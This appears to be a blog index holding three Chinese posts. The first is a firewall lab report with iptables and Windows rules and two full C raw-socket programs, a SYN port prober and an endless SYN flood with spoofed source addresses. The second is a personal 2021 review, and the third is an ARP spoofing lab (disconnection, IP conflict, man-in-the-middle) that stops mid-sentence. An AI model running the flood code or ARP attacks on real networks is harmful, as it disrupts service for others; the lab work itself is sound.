首先，它对该用户的身份进行验证。 若为合法用户，则把请求转发给真正的某个内部网络的主机，同时监控用户的操作，拒绝不合法的访问。 当内部网络向外部网络申请服务时，代理服务器的工作过程刚好相反。 实验环境\nFTP服务器 windows xp IP:192.168.195.162 FTP客户端 以及 Windows防火墙 Windows xp IP:192.168.195.131 Linux 防火墙 Centos 7: 192.168.195.174 实验工具\n发送tcp包到目的机随机端口的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; struct iphdr { unsigned char ver_and_hdrlen;// 版本号与IP头部长度 unsigned char tos; // 服务类型 unsigned short total_len; // 总长度 unsigned short id; // IP包ID unsigned short flags; // 标志位(包括分片偏移量) unsigned char ttl; // 生命周期 unsigned char protocol; // 上层协议 unsigned short checksum; // 校验和 unsigned int srcaddr; // 源IP地址 unsigned int dstaddr; // 目标IP地址 }; struct tcphdr { unsigned short sport; // 源端口 unsigned short dport; // 目标端口 unsigned int seq; // 序列号 unsigned int ack_seq; // 确认号 unsigned char len; // 首部长度 unsigned char flag; // 标志位 unsigned short win; // 窗口大小 unsigned short checksum; // 校验和 unsigned short urg; // 紧急指针 }; struct pseudohdr { unsigned int saddr; unsigned int daddr; char zeros; char protocol; unsigned short length; }; unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // 源IP地址 ip-\u0026gt;dstaddr = dstaddr; // 目标IP地址 } void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // 随机生成一个端口 tcp-\u0026gt;dport = htons(dport); // 目标端口 tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // 随机生成一个初始化序列号 tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } int make_syn_packet(char *packet, int pkt_len, unsigned int daddr,unsigned int saddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP 头部 struct tcphdr tcp; //TCP 头部 struct pseudohdr pseudo; //TCP 伪头部 //saddr = inet_addr(\u0026#34;192.168.195.145\u0026#34;); len = sizeof(ip) + sizeof(tcp); // 初始化头部信息 init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //计算IP校验和 ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // 计算TCP校验和 bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // 复制TCP伪头部 memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // 复制TCP头部 tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } int make_raw_socket() { int fd; int on = 1; // 创建一个原始套接字, 指定其关注TCP协议 fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // 设置需要手动构建IP头部 if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } return fd; } int send_syn_packet(int i ,int sockfd, unsigned int addr, unsigned int sddr,unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%d 端口已经探测\\n\u0026#34;,i); pkt_len = make_syn_packet(packet, 256, addr,sddr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } int main(int argc, char *argv[]) { unsigned int addr; unsigned int sddr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } addr = inet_addr(argv[1]); sddr = inet_addr(argv[2]); sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } for (int i = 0 ; i \u0026lt;= 1024; i++) { port = i; if (send_syn_packet(i,sockfd, addr,sddr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } i +=1; } close(sockfd); return 0; } 发送tcp包到目的机确定端口的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; // ip 报头 struct iphdr { unsigned char ver_and_hdrlen;// 版本号与IP头部长度 unsigned char tos; // 服务类型 unsigned short total_len; // 总长度 unsigned short id; // IP包ID unsigned short flags; // 标志位(包括分片偏移量) unsigned char ttl; // 生命周期 unsigned char protocol; // 上层协议 unsigned short checksum; // 校验和 unsigned int srcaddr; // 源IP地址 unsigned int dstaddr; // 目标IP地址 }; // tcp 报头 struct tcphdr { unsigned short sport; // 源端口 unsigned short dport; // 目标端口 unsigned int seq; // 序列号 unsigned int ack_seq; // 确认号 unsigned char len; // 首部长度 unsigned char flag; // 标志位 unsigned short win; // 窗口大小 unsigned short checksum; // 校验和 unsigned short urg; // 紧急指针 }; //TCP的伪报头，在计算TCP的校验和时需要包含 struct pseudohdr { unsigned int saddr; //源目的IP unsigned int daddr; // 目的IP char zeros; // 8位保留字符 一般置0 char protocol;// 协议 unsigned short length; // 长度 }; // 这个是计算校验和的函数 unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } // 通过传入的源 IP 地址和目标 IP 地址初始化 IP 头部结构。 void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // 源IP地址 ip-\u0026gt;dstaddr = dstaddr; // 目标IP地址 } // 初始化 tcp 包 void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // 随机生成一个端口 tcp-\u0026gt;dport = htons(dport); // 目标端口 tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // 随机生成一个初始化序列号 tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; // 0x02 代表 是syn 包，tcp三次连接请求的开始 tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } // 初始化 tcp 伪报头 void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } // 通过 目标IP地址 和 目标端口 生成一个 SYN包，保存到参数 packet 中，并且返回包的大小。 int make_syn_packet(char *packet, int pkt_len, unsigned int daddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP 头部 struct tcphdr tcp; //TCP 头部 struct pseudohdr pseudo; //TCP 伪头部 unsigned int saddr = rand(); len = sizeof(ip) + sizeof(tcp); // 初始化头部信息 init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //计算IP校验和 ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // 计算TCP校验和 bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // 复制TCP伪头部 memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // 复制TCP头部 tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } // 创造原始套接字 int make_raw_socket() { int fd; int on = 1; // 创建一个原始套接字, 指定其关注TCP协议 fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // 设置需要手动构建IP头部 if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } /* 在调用 socket() 函数创建套接字时，指定第二个参数为 SOCK_RAW，表示创建的套接字为原始套接字。然后调用 setsockopt() 函\t数设置 IP 头部由我们自己构建 */ return fd; } // 传入原始套接字、目标IP地址和目标端口，然后通过调用 sendto() 函数向服务端发送一个 SYN包 int send_syn_packet(int sockfd, unsigned int addr, unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%d已攻击!\\n\u0026#34;,addr); pkt_len = make_syn_packet(packet, 256, addr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } // 主函数 int main(int argc, char *argv[]) { unsigned int addr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } // argv[1] 目的地址 // argc[2] 目的端口 addr = inet_addr(argv[1]); port = atoi(argv[2]); // 判断端口是否 存在 if (port \u0026lt; 0 || port \u0026gt; 65535) { fprintf(stderr, \u0026#34;Invalid destination port number: %s\\n\u0026#34;, argv[2]); exit(1); } // 开启socket sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } // for 无限循环，发送syn包 for (;;) { if (send_syn_packet(sockfd, addr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } } close(sockfd); return 0; } Windows防火墙：天网防火墙\nLinux防火墙： iptables\nFTP服务器：Ser-U\n抓包工具：Wireshark\nUDP攻击：UDP-Flood\n0x03 实验内容 3.1 windows防火墙 3.1.1 过滤远程服务器（R）到本地主机（L）的TCP数据 在防火墙中添加如下规则： 这样接收到的所有TCP包都会被拦截，并且被记录。 没有开启防火墙前，在终端执行发送随机端口的tcp程序 通过Wireshark抓包，我们可以看到此时的TCP包并没有被拦截。 开启防火墙，再度启动程序。 可以看到防火墙进行提醒，并且日志里面显示了攻击机向靶机192.168.195.131的端口tcp连接。 因此加上该端口后，所有tcp包都被截断了。 3.1.2 过滤R-\u0026gt;L中数据包源端口为21或80的数据 发送到端口为21和80的传输层协议可能为tcp也可能为udp\n因此编写进出规则的时候，我们需要对TCP和UDP都进行限制。\nUDP TCP 因为我的客户端已经开启了21和80端口，所有我们这里直接选择已授权开放的端口即可。 TCP\n防火墙开启前：\n可以看到TCP包可以发到机器。 开启防火墙\n攻击80端口\n可以看到在日志里面程序连接80端口被拒绝。 攻击21端口\n可以看到这里连接21端口同样被拒绝。\nUDP\n关闭防火墙\n攻击80端口\n可以看到抓到udp包\n开启防火墙\n攻击80端口\n可以看到80端口的udp包已被拦截 攻击21端口\n可以看到21端口的udp包已被拦截\n3.1.3 能够由本机登录ftp服务器成功（通过用户名、密码验证） 在windows xp192.168.195.162中搭建ftp服务器 创建一个ftp用户，账户为admin，密码为admin； 我们在本机访问服务器端 我们成功访问到服务器端。 设置规则 当我们向服务器端发送ftp请求的时候，会通行。 3.1.4 阻止将ftp内容列表、上传、下载数据 这里我们是原先的客户端作为新的服务器，另一台机子来访问这个新的服务器，我们需要在服务区的防火墙上配置规则，从而阻止客户端下载服务器端内容 在新的服务器端配置FTP 客户端查看效果 在服务器端配置防护墙规则 当收到端口为21的tcp请求的时候拒绝该访问，这样就保证了客户端不能从服务器下载。 开启防火墙 结果 我们可以在日志里面看到 IP192.168.195.182对客户端的连接被拒绝 同时，该网页也无法打开，自然查看列表什么的，上传、下载都无法进行， 3.2 Linux防火墙 iptables 3.2.1 Iptables防火墙的启动停止 首先通过以下命令安装好iptables\n1 2 3 4 systemctl stop firewalld.service systemctl mask firewalld.service yum install iptables-services systemctl enable iptables.service 然后通过命令service iptables status查看此时的iptables状态\n此时防火墙为打开状态 关闭防火墙service iptables stop\n再度查看此时防火墙状态 发现此时防火墙已关闭。 打开防火墙service iptables start\n再查看防火墙状态 防火墙已打开 3.2.2 Iptables防火墙规则查看、添加、删除 查看\n命令 iptables -L -n 列出（filter表）所有规则 命令 iptables -nL –line-number 列出（filter表）所有规则，带编号 命令 iptables -L -n -t nat 列出（nat表）所有规则 添加\n添加规则有两个参数：-A和-I。其中-A是添加到规则的末尾；-I可以插入到指定位置，没有指定位置的话默认插入到规则的首部。 当前规则： 添加一条规则到尾部：iptables –A INPUT -j ACCEPT 意思为：向filter表（默认表）的INPUT链中追加一条规则，其功能是接受源地址为任意、目标地址为防火墙本身的所有数据包。 第六条即为我们新加入的规则 添加一条规则到第三条： iptables -I INPUT 3 -s 192.168.195.131 -j DROP 可以看到新规则添加到第三条了 删除\n删除用-D参数\n删除之前添加的规则 iptables -A INPUT -j ACCEPT：\n命令： iptables -D INPUT -j ACCEPT\n可以看到我们之前添加的第七条规则已经被删除。 有时候要删除的规则太长，删除时要写一大串，既浪费时间又容易写错，这时我们可以先使用–line-number找出该条规则的行号，再通过行号删除规则。这里我们删除第三行我们插入的规则。\n命令：iptables -D INPUT 3\n可以看到我们插入的第三条规则已经被删除。\n3.2.3 设置Iptables防火墙的包过滤规则，实现以下功能 3.2.3.1 禁止所有进出本地主机的数据包通过（通过Ping验证） 我们首先将所有规则都删除iptables -F 可以看到我们之前的规则全部被清除掉。 此时我们通过机器192.168.195.131来ping我们此时的Linux主机192.168.195.174 正常可以ping通 禁止所有进入本地机器的数据包通过 命令如下：iptables -I INPUT -j DROP 将规则加入到INPUT链中 所有发给本机的包都会被丢弃掉 此时再度ping我们的本机192.168.195.174 很明显的主机已经接收不到ping的包了 3.2.3.2 允许某特定IP主机远程ping本地主机 将所有规则清零iptables -F\n允许某特定IP主机远程ping本地主机\n我们这里设定运行192.168.195.131可以ping通，其余的主机均无法ping通机器\n命令：\n1 2 iptables -I INPUT -j DROP iptables -I INPUT -s 192.168.195.131 -j ACCEPT 因为iptables中规则的执行为从上到下，所以按照上述给定的程序插入规则。\n结果为：\n这样就保证接收到192.168.195.131的包，其余的包均丢弃。\n这里直接放出两个机器防火墙开启前后ping的状态。\n其他机器 192.168.195.131 3.2.3.3 允许某特定IP主机远程telnet或putty本地主机 将所有规则清零iptables -F\n允许某特定IP主机远程telnet或putty本地主机,，开启端口23 即可\n命令：\n1 2 iptables -I INPUT -p tcp --dport 23 -j DROP iptables -I INPUT -s 192.168.195.131 -p tcp --dport 23 -j ACCEPT 目的端口为23的被丢弃，因为第二条规则顺序在第一条前面，所有先判断是否为特定IP，是的则接受，否则丢弃。 开启防火墙前：\n192.168.195.131\n其他机器：\ntelent均可以正常连接\n开启iptables\n对于192.168.195.131的机器\n发现仍然可以正好连接telnet 对于其他机器\n可以看到连接不到telnet 0x04 选做题 4.1 由本机登录ftp服务器成功（通过用户名、密码验证） 允许本机登录其他服务器的ftp:192.168.195.162\n因此这里的防火墙为output向外面服务器以21端口发送请求。\n命令：iptables -A OUTPUT -p tcp --sport 21 -j ACCEPT\n所有源端口为21 发往外网的包都被允许通过。 执行防火墙之后，我们可以发现我们发往外网21端口的包可以被ACCEPT 然后通过ftp 192.168.195.131 输入账户admin和密码admin 我们成功连接到了ftp服务器。 4.2 无法将ftp内容列表或上传、下载数据 这里我们的Centos 7本身作为一个FTP服务器来等待客户端的连接。\n在本地配置好ftp环境\n可以看到我们的环境已经配置完毕 同时在客户端，我们也可以访问Linux服务器 为了禁止其他用户下载我们linux服务器端的所有数据，也防止上传,即禁止用户访问我们的FTP服务器。\n所以有命令：iptables -I INPUT -p tcp --dport 21 -j DROP 所有目的端口为21的数据包都将被丢弃 此时我们的客户端再度访问我们的Linux FTP 服务器端\n可以看到我们此时已经无法访问该文件夹了。无法访问到我们的Linux服务器 0x05 实验结论 通过对Windows下和Linux下防火墙的配置情况，自己亲自编写防火墙的相关规则，对包过滤防火墙有了进一步的了解和认知。同时针对不同环境下防火墙配置，Linux下的防火墙配置应该比Windwos更为自由，自定义的比较多。 ","permalink":"http://www.reus09.top/posts/tech/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/","summary":"防火墙实验 0x01 实验目标 选择一种主流的软件防火墙，熟悉其安全规则配置，通过配置防火墙规则，实现以下功能： 过滤远程服务器（R）到本地主机（L）的T","title":"防火墙实验"},{"content":"2021 小结 当一个人坐在空无一人的宿舍里，也许是无聊吧，也许是眼慕朋友圈满天飞的跨年小结，也许是看各种推送的年度总结有感，因此总想写点什么东西，特别是在这种孤单的气氛中，这种感觉很难形容，总想提笔倾诉一点东西，不吐不快。 2021年总的来说，成功遗憾参半。如果2021年度总分十分的话，我只能打到7分。 这大概是本人第一次个人年度小结，当然也没人看，也就随便写写自己相对自己想说的话。 2021年度的收获 当然说起收获，自然是这个写作的平台博客了。 探店北京美食。 在Lord佬的带飞下，拿个天融信小奖项。 收获一批很不错的足球小伙伴。最后也拿了一个网安院的小足球比赛的冠军。 去逛了从小到大书本里记载里的长城，初春时刻，看巍峨的长城崎岖蜿蜒。 在学业上有了相当程度的精进，大一时候存在一定的摆烂，因此大一的成绩与保研无望，同时人际交往较少，但是大二通过担任班级学委，可以说极大拓展了交往的朋友圈，也认识了可以一些可以相识的朋友，成绩也有了一些小突破，可以说比较接近保研的名额。 人际交往方面，个人性格的缺点相当严重，自卑吧，也许只能在熟人面前能够倾吐自己的想法，但是这种讲话的方式却又十分的丑陋，往往会惹得其他人不满，然后自己也相当不爽，但是自己也只能把所有心事埋在心里，自己不断地反思自己的问题，也许就是谨言慎行吧，说话要懂得符合事宜、不能满嘴跑火车，说话方式也有了极大地改善。 性格方面，这一年应该说成长了不少，因为从小接受教育比较封闭的问题，初中高中的沟通比较少，内向还是有的。这一年通过一些交流、外出游玩性格应该是开放了一点、敢说，不再是自闭儿童了。其实吧，人应该自信一点。 技术方面：学了爬虫、简单的web前端、php、还有一些CTF的方向。 生活习惯：相当不自律，大三上的半年中每晚平均都是一点半之后睡觉，大部分都是二点之后才浑浑噩噩的睡着，昼夜作息极度紊乱，早餐基本半年没吃过一次。 BVB，罗伊斯拿下人生中第一个比较重要的冠军头衔：德国杯。 2021年的遗憾 最大的遗憾应该是大学两年半，却从未去过号称文化精华的故宫，总是以各种各样的原因鸽了故宫，这里立一个flag:2022年度无论如何都要看一看故宫的模样。 还有遗憾就是，大学第一次相对正式的足球比赛，校长杯表现相当糟糕，也许一生中也很难忘记这场比赛，总而言之，就是心态糟糕，技术糟糕。 还有就是对于想学的技术往往不能坚持到底，意志力不够强大，一直对网络安全方面的知识感兴趣，但是总是三心二意。 在相识的人中，走丢了一些人。也许这就是人生吧，当有人意见与你想左的时候，你不能强迫所有人都能达成共识，不是所有人的三观都是相同的，总有人要下车，也总有人要上车，静观其变，随其飞去吧。 本学期的相当一部分作业为小组合作形式，往往不能够正常的分工、合作、团队意识还是欠缺。 还有就是对于想要的不敢直说，(这就是含蓄？)，毫无疑问，这丢掉了一大堆想要的东西，可望而不可即。 对于学委的工作，有一点疲倦，如果可以，任期满的时候考虑辞职。 大三上的半年课认识到了院里老师的一些水平，是时候考虑往更大的方向考虑。 2022 希望 1、去一次故宫 2、努力学习技术，拿到一个心仪的实习offer 3、继续专心学习，确保学业能够拿到保研资格 4、对足球更上心吧，练练技术、拉拉体能，争取能在校长杯上场吧，有所表现吧。 5、继续目前的人际交往，如果可以，可以认识更多的朋友。 6、去更多的地方游玩，希望五一或国庆假期到内蒙或者长沙玩一次。 总结 总而言之，就是以上了，还是太矫情了，但是吧，人总要倾吐一点东西，2021就这样吧，2021就到这里了。\n希望2022会更好。\n","permalink":"http://www.reus09.top/posts/life/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/","summary":"2021 小结 当一个人坐在空无一人的宿舍里，也许是无聊吧，也许是眼慕朋友圈满天飞的跨年小结，也许是看各种推送的年度总结有感，因此总想写点什么东西，特","title":"2021年度总结"},{"content":"ARP欺骗实验 0x01 实验前提知识 ARP协议的安全问题 ARP协议是建立在信任局域网内所有结点的基础上的，它高效，但却不安全。\nARP高速缓存根据所接收到的ARP协议包随时进行动态更新，它是无状态的协议，不会检查自己是否发过请求包，只要收到目标MAC是自己的ARP响应数据包或ARP广播包，都会接受并缓存。\nARP协议没有认证机制，只要接收到的协议包是有效的，主机就无条件地根据协议包的内容刷新本机ARP缓存，并不检查该协议包的合法性。\n因此攻击者可以随时发送虚假ARP包更新被攻击主机上的ARP缓存，进行地址欺骗或拒绝服务攻击。\nARP Reply Spoofing 构造虚假的ARP响应包，篡改目标主机的MAC地址，例：\n广播攻击 当数据包的目标MAC地址为FF:FF:FF:FF:FF:FF，该数据包将会被广播。构造响应包，其中协议地址为网关IP，而MAC地址为广播地址，将这样的响应包发给局域网内主机。那么，局域网主机发给网关的数据包都将被广播。这既是一种嗅探方法，也可作为干扰网络服务的攻击方法。 拒绝服务攻击 构造虚假响应包，其中协议地址为关键服务的IP地址，例如网关，而MAC地址为不存在的虚假地址，将这样的响应包发给局域网内主机。那么，局域网主机发给关键服务（如网关）的数据包都将丢失，从而形成拒绝服务攻击。 中间人攻击 0x02 实验工具及环境 部署于同一局域网下，Vmware内部的两台Winxp 以及 主机 的三台机器 攻击机 win xp IP: 192.168.195.131 MAC : 00-0c-29-06-65-c9 靶机 win xp IP : 192.168.185.138 MAC : 00-0c-29-19-ba-6e win 10 IP : 192.168.195.1 MAC : 00-50-56-c0-00-08 网关 IP : 192.168.195.2 MAC : 00-50-56-e7-d4-22 工具 WinArpAttacker visual studio 19 wireshark 0x03 使用在线工具WinArpAttacker 禁止上网功能 靶机 IP ： 192.168.185.138\n未进行禁止上网前的 靶机状态，可以正常上网\n在WinArpAttacker工具中选取靶机IP：192.168.185.138 进行禁止上网攻击\n发现此时的网站刷新后无法打开，并且 该靶机 与 网关 192.168.195.2的MAC 地址被篡改为 01-01-01-01-01-01\n利用Wireshark抓取禁止上网的流量包\n抓获到两条arp数据包 分析第一个arp数据包 源MAC 被设置为 错误的MAC地址 :01-01-01-01-01-01 (该MAC地址不会被用到) 源IP 为靶机 的IP : 192.168.195.138 目的 MAC 和 目的 IP 均指向正确的 网关 IP 和地址 由此 网关中存取的ARP 表中 靶机IP 192.168.195.138 对应的MAC 地址被更新为 01-01-01-01-01-01 分析第二个数据包 源MAC 被设置为 错误的MAC地址 :01-01-01-01-01-01 (该MAC地址不会被用到) 源IP 为 网关 的IP : 192.168.195.2 目的 MAC 和 目的 IP 均指向正确的 靶机（192.168.195.138） IP 和地址 由此 靶机中存取的ARP 表中 网关IP 192.168.195.2 对应的MAC 地址被更新为 01-01-01-01-01-01 由此实现了 网关和靶机(192.168.195.138) 之间的MAC地址均为错误的目标机MAC地址，当靶机访问外网的时候，MAC无法访问正确的网卡，同时网关也无法访问 靶机，从而无法与外网数据相同，从而无法上网。\nIP冲突功能 靶机IP : 192.168.195.138\n未进行IP冲突前，靶机可以正常上网\n在WinArpAttacker工具中选取靶机IP：192.168.185.138 进行定时IP冲突和 不断IP 冲突。\n在靶机观察到，系统产生提醒：\nIP地址与网络上的其他系统有冲突。 用Wireshark分别抓包 定时IP冲突和不断IP冲突\n定时IP冲突 不断IP冲突 可以发现不断IP冲突即为将定时IP冲突发送的ARP包 连续发送 1000次 形成洪泛攻击而已。\n因此这里只需要分析IP冲突的 一个ARP 包即可。\n源MAC 被设置为 错误的MAC地址 :01-01-01-01-01-01 (该MAC地址不会被用到) 源IP 为靶机 的IP : 192.168.195.138 目的 MAC 和 目的 IP 均指向正确的 靶机（192.168.195.138） IP 和地址 由此相当于，靶机向自身发送了大量MAC地址为错误地址01-01-01-01-01-01的ARP包，从而引起IP冲突，使靶机无法上网\n中间人攻击 实现用攻击机(IP:192.168.195.131) 检测 靶机(IP:192.168.195.1) ping 靶机(IP : 192.168.195.138)\n没有用中间人攻击前\n主机ping 靶机(192.168.195.138 ) 可以看到速度很\n主机win 10 的 ARP 表对应地址\n靶机 win xp 的 ARP表对应MAC\n可以看到主机win10 和 靶机xp 之间的mac 对应关系正确。\n在WinArpAttacker工具中选取靶机IP：192.168.185.138 和主机win10 IP (192.168.195.1) 进行监管主机通讯\n此时再度由主机win10 ping 靶机 win xp\n可以很明显的看到 ping 发送的时间间隔大幅度变长。\n与此同时，主机WIN10的ARP表 目标靶机ip(192.168.195.138)的MAC 地址被篡改为 